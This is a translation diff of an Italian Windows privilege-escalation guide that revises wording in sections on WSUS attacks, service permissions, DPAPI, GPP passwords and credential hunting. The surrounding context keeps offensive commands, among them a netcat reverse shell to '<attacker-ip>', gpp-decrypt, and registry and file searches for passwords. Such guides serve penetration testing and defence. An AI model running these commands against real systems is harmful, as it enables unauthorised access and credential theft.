@@ -16,7 +16,7 @@ access-tokens.md
 
 ### ACL - DACL/SACL/ACE
 
-**Controlla la seguente pagina per ulteriori informazioni su ACL - DACL/SACL/ACE:**
+**Controlla la seguente pagina per ulteriori informazioni sulle ACL - DACL/SACL/ACE:**
 
 {{#ref}}
 acls-dacls-sacls-aces.md
@@ -167,7 +167,7 @@ E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 
 
 Allora, **è sfruttabile.** Se l'ultimo registro è uguale a 0, l'entry WSUS sarà ignorata.
 
-Per sfruttare queste vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Questi sono script di exploit MiTM armati per iniettare aggiornamenti 'falsi' nel traffico WSUS non SSL.
+Per sfruttare queste vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Questi sono script di exploit armati MiTM per iniettare aggiornamenti 'falsi' nel traffico WSUS non SSL.
 
 Leggi la ricerca qui:
 
@@ -178,11 +178,11 @@ Leggi la ricerca qui:
 [**Leggi il rapporto completo qui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
 Fondamentalmente, questo è il difetto che questo bug sfrutta:
 
-> Se abbiamo il potere di modificare il nostro proxy utente locale, e Windows Updates utilizza il proxy configurato nelle impostazioni di Internet Explorer, quindi abbiamo il potere di eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro stesso traffico ed eseguire codice come utente elevato sul nostro asset.
+> Se abbiamo il potere di modificare il nostro proxy utente locale, e gli aggiornamenti di Windows utilizzano il proxy configurato nelle impostazioni di Internet Explorer, quindi abbiamo il potere di eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro stesso traffico ed eseguire codice come utente elevato sul nostro asset.
 >
 > Inoltre, poiché il servizio WSUS utilizza le impostazioni dell'utente corrente, utilizzerà anche il suo archivio certificati. Se generiamo un certificato autofirmato per il nome host WSUS e aggiungiamo questo certificato nell'archivio certificati dell'utente corrente, saremo in grado di intercettare sia il traffico WSUS HTTP che HTTPS. WSUS non utilizza meccanismi simili a HSTS per implementare una validazione di tipo trust-on-first-use sul certificato. Se il certificato presentato è fidato dall'utente e ha il nome host corretto, sarà accettato dal servizio.
 
-Puoi sfruttare questa vulnerabilità utilizzando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta che sarà liberato).
+Puoi sfruttare questa vulnerabilità utilizzando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta che è stato liberato).
 
 ## KrbRelayUp
 
@@ -208,7 +208,7 @@ Se hai una sessione meterpreter, puoi automatizzare questa tecnica utilizzando i
 
 ### PowerUP
 
-Usa il comando `Write-UserAddMSI` da power-up per creare all'interno della directory corrente un binario MSI di Windows per elevare i privilegi. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi avrai bisogno di accesso GIU):
+Usa il comando `Write-UserAddMSI` di power-up per creare all'interno della directory corrente un binario MSI di Windows per elevare i privilegi. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi avrai bisogno di accesso GIU):
 ```
 Write-UserAddMSI
 ```
@@ -289,7 +289,7 @@ reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Credentials Guard
 
-**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo contro minacce come gli attacchi pass-the-hash.| [**Ulteriori informazioni su Credentials Guard qui.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo da minacce come gli attacchi pass-the-hash.| [**Ulteriori informazioni su Credentials Guard qui.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
@@ -336,7 +336,7 @@ Controlla la pagina seguente per **scoprire token interessanti** e come abusarne
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-### Utenti connessi / Sessioni
+### Utenti registrati / Sessioni
 ```bash
 qwinsta
 klist sessions
@@ -416,7 +416,7 @@ Puoi usare **sc** per ottenere informazioni su un servizio
 ```bash
 sc qc <service_name>
 ```
-Si consiglia di avere il binario **accesschk** di _Sysinternals_ per controllare il livello di privilegio richiesto per ciascun servizio.
+Si consiglia di avere il binario **accesschk** da _Sysinternals_ per controllare il livello di privilegio richiesto per ciascun servizio.
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
@@ -470,7 +470,7 @@ I privilegi possono essere elevati attraverso vari permessi:
 - **GENERIC_WRITE**: Eredita anche la capacità di modificare le configurazioni del servizio.
 - **GENERIC_ALL**: Eredita anch'essa la capacità di modificare le configurazioni del servizio.
 
-Per la rilevazione e lo sfruttamento di questa vulnerabilità, si può utilizzare _exploit/windows/local/service_permissions_.
+Per la rilevazione e lo sfruttamento di questa vulnerabilità, si può utilizzare il _exploit/windows/local/service_permissions_.
 
 ### Permessi deboli dei binari dei servizi
 
@@ -602,7 +602,7 @@ privilege-escalation-with-autorun-binaries.md
 
 ### Driver
 
-Cerca possibili driver **di terze parti strani/vulnerabili**.
+Cerca possibili driver **di terze parti strani/vulnerabili**
 ```bash
 driverquery
 driverquery.exe /fo table
@@ -610,7 +610,7 @@ driverquery /SI
 ```
 ## PATH DLL Hijacking
 
-Se hai **permessi di scrittura all'interno di una cartella presente nel PATH** potresti essere in grado di dirottare un DLL caricata da un processo e **escalare i privilegi**.
+Se hai **permessi di scrittura all'interno di una cartella presente nel PATH** potresti essere in grado di dirottare una DLL caricata da un processo e **escalare i privilegi**.
 
 Controlla i permessi di tutte le cartelle all'interno del PATH:
 ```bash
@@ -719,7 +719,7 @@ Puoi quindi utilizzare `runas` con l'opzione `/savecred` per utilizzare le crede
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-Utilizzando `runas` con un set di credenziali fornito.
+Utilizzando `runas` con un insieme di credenziali fornite.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
@@ -727,18 +727,18 @@ Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/c
 
 ### DPAPI
 
-L'**API di Protezione Dati (DPAPI)** fornisce un metodo per la crittografia simmetrica dei dati, utilizzato prevalentemente all'interno del sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto dell'utente o del sistema per contribuire significativamente all'entropia.
+L'**API di Protezione Dati (DPAPI)** fornisce un metodo per la crittografia simmetrica dei dati, utilizzato prevalentemente all'interno del sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto utente o di sistema per contribuire significativamente all'entropia.
 
-**DPAPI consente la crittografia delle chiavi attraverso una chiave simmetrica derivata dai segreti di accesso dell'utente**. In scenari che coinvolgono la crittografia del sistema, utilizza i segreti di autenticazione del dominio del sistema.
+**DPAPI consente la crittografia delle chiavi attraverso una chiave simmetrica derivata dai segreti di accesso dell'utente**. In scenari che coinvolgono la crittografia di sistema, utilizza i segreti di autenticazione del dominio del sistema.
 
-Le chiavi RSA dell'utente crittografate, utilizzando DPAPI, sono memorizzate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta il [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, co-locata con la chiave master che protegge le chiavi private dell'utente nello stesso file**, consiste tipicamente di 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è ristretto, impedendo l'elenco dei suoi contenuti tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
+Le chiavi RSA utente crittografate, utilizzando DPAPI, sono memorizzate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta l'[Identificatore di Sicurezza](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, co-locata con la chiave master che protegge le chiavi private dell'utente nello stesso file**, consiste tipicamente di 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è ristretto, impedendo l'elenco dei suoi contenuti tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
 ```powershell
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
 Puoi usare il **modulo mimikatz** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decrittarlo.
 
-I **file di credenziali protetti dalla password principale** si trovano solitamente in:
+I **file delle credenziali protetti dalla password principale** si trovano solitamente in:
 ```powershell
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
@@ -786,7 +786,7 @@ e in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
-### **Gestore delle credenziali di Desktop remoto**
+### **Gestore Credenziali Desktop Remoto**
 ```
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
@@ -799,7 +799,7 @@ Le persone spesso usano l'app StickyNotes sui workstation Windows per **salvare 
 
 ### AppCmd.exe
 
-**Nota che per recuperare le password da AppCmd.exe devi essere Amministratore e eseguire con un livello di alta integrità.**\
+**Nota che per recuperare password da AppCmd.exe devi essere Amministratore e eseguire con un livello di alta integrità.**\
 **AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\` .\
 Se questo file esiste, allora è possibile che alcune **credenziali** siano state configurate e possano essere **recuperate**.
 
@@ -932,6 +932,8 @@ C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
 Puoi anche cercare questi file utilizzando **metasploit**: _post/windows/gather/enum_unattend_
+
+Esempio di contenuto:
 ```xml
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
 <AutoLogon>
@@ -976,9 +978,9 @@ Cerca un file chiamato **SiteList.xml**
 
 ### Cached GPP Pasword
 
-Una funzionalità era precedentemente disponibile che consentiva il deployment di account amministratore locali personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava significative vulnerabilità di sicurezza. In primo luogo, gli oggetti di Criteri di Gruppo (GPO), memorizzati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente di dominio. In secondo luogo, le password all'interno di questi GPP, crittografate con AES256 utilizzando una chiave predefinita documentata pubblicamente, potevano essere decrittografate da qualsiasi utente autenticato. Questo rappresentava un serio rischio, poiché poteva consentire agli utenti di ottenere privilegi elevati.
+Una funzione era precedentemente disponibile che consentiva il deployment di account amministratore locali personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava significative vulnerabilità di sicurezza. In primo luogo, gli oggetti di Group Policy (GPO), memorizzati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente di dominio. In secondo luogo, le password all'interno di questi GPP, criptate con AES256 utilizzando una chiave predefinita documentata pubblicamente, potevano essere decriptate da qualsiasi utente autenticato. Questo rappresentava un serio rischio, poiché poteva consentire agli utenti di ottenere privilegi elevati.
 
-Per mitigare questo rischio, è stata sviluppata una funzione per cercare file GPP memorizzati localmente contenenti un campo "cpassword" che non è vuoto. Una volta trovato un file del genere, la funzione decrittografa la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, aiutando nell'identificazione e nella risoluzione di questa vulnerabilità di sicurezza.
+Per mitigare questo rischio, è stata sviluppata una funzione per cercare file GPP memorizzati localmente contenenti un campo "cpassword" che non è vuoto. Una volta trovato un file del genere, la funzione decripta la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, aiutando nell'identificazione e nella risoluzione di questa vulnerabilità di sicurezza.
 
 Cerca in `C:\ProgramData\Microsoft\Group Policy\history` o in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (precedente a W Vista)_ per questi file:
 
@@ -989,7 +991,7 @@ Cerca in `C:\ProgramData\Microsoft\Group Policy\history` o in _**C:\Documents an
 - Printers.xml
 - Drives.xml
 
-**Per decrittografare il cPassword:**
+**Per decriptare il cPassword:**
 ```bash
 #To decrypt these passwords you can decrypt it using
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
@@ -998,7 +1000,7 @@ Utilizzando crackmapexec per ottenere le password:
 ```bash
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
-### Configurazione Web di IIS
+### Configurazione Web IIS
 ```powershell
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
@@ -1190,13 +1192,13 @@ cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
-**Cerca un file con un certo nome di file**
+**Cerca un file con un certo nome**
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
 ```
-**Cerca nel registro chiavi e password**
+**Cerca nel registro i nomi delle chiavi e le password**
 ```bash
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
@@ -1249,7 +1251,7 @@ Compare-Object -ReferenceObject $process -DifferenceObject $process2
 ```
 ## Furto di password dai processi
 
-## Da Utente a Basso Privilegio a NT\AUTHORITY SYSTEM (CVE-2019-1388) / Bypass UAC
+## Da utente con privilegi bassi a NT\AUTHORITY SYSTEM (CVE-2019-1388) / Bypass UAC
 
 Se hai accesso all'interfaccia grafica (tramite console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" da un utente non privilegiato.
 
@@ -1324,7 +1326,7 @@ sc start newservicename
 ```
 ### AlwaysInstallElevated
 
-Da un processo ad alta integrità potresti provare a **abilitare le voci di registro AlwaysInstallElevated** e **installare** una reverse shell utilizzando un _**.msi**_ wrapper.\
+Da un processo ad alta integrità puoi provare a **abilitare le voci di registro AlwaysInstallElevated** e **installare** una reverse shell utilizzando un _**.msi**_ wrapper.\
 [Maggiori informazioni sulle chiavi di registro coinvolte e su come installare un pacchetto _.msi_ qui.](./#alwaysinstallelevated)
 
 ### Privilegi High + SeImpersonate a System
@@ -1350,7 +1352,9 @@ Se riesci a **hijackare un dll** che viene **caricato** da un **processo** in es
 
 ### **Da Administrator o Network Service a System**
 
-{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}
+{{#ref}}
+https://github.com/sailay1996/RpcSsImpersonator
+{{#endref}}
 
 ### Da LOCAL SERVICE o NETWORK SERVICE a privilegi completi
 
@@ -1367,9 +1371,9 @@ Se riesci a **hijackare un dll** che viene **caricato** da un **processo** in es
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Controlla per misconfigurazioni e file sensibili (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- Controlla per alcune possibili misconfigurazioni e raccoglie informazioni (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
-[**privesc** ](https://github.com/enjoiz/Privesc)**-- Controlla per misconfigurazioni**\
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Controlla configurazioni errate e file sensibili (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Controlla alcune possibili configurazioni errate e raccoglie informazioni (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
+[**privesc** ](https://github.com/enjoiz/Privesc)**-- Controlla configurazioni errate**\
 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae informazioni sulle sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Usa -Thorough in locale.**\
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae credenziali dal Credential Manager. Rilevato.**\
 [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spruzza le password raccolte attraverso il dominio**\
@@ -1381,11 +1385,11 @@ Se riesci a **hijackare un dll** che viene **caricato** da un **processo** in es
 **Exe**
 
 [**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca vulnerabilità di privesc note (deve essere compilato utilizzando VisualStudio) ([**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando misconfigurazioni (più uno strumento di raccolta informazioni che di privesc) (deve essere compilato) **(**[**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando configurazioni errate (più uno strumento di raccolta informazioni che di privesc) (deve essere compilato) **(**[**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
 [**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae credenziali da molti software (exe precompilato in github)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Porting di PowerUp in C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Controlla per misconfigurazioni (eseguibile precompilato in github). Non raccomandato. Non funziona bene in Win10.\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Controlla per possibili misconfigurazioni (exe da python). Non raccomandato. Non funziona bene in Win10.
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Controlla configurazioni errate (eseguibile precompilato in github). Non raccomandato. Non funziona bene in Win10.\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Controlla possibili configurazioni errate (exe da python). Non raccomandato. Non funziona bene in Win10.
 
 **Bat**
 
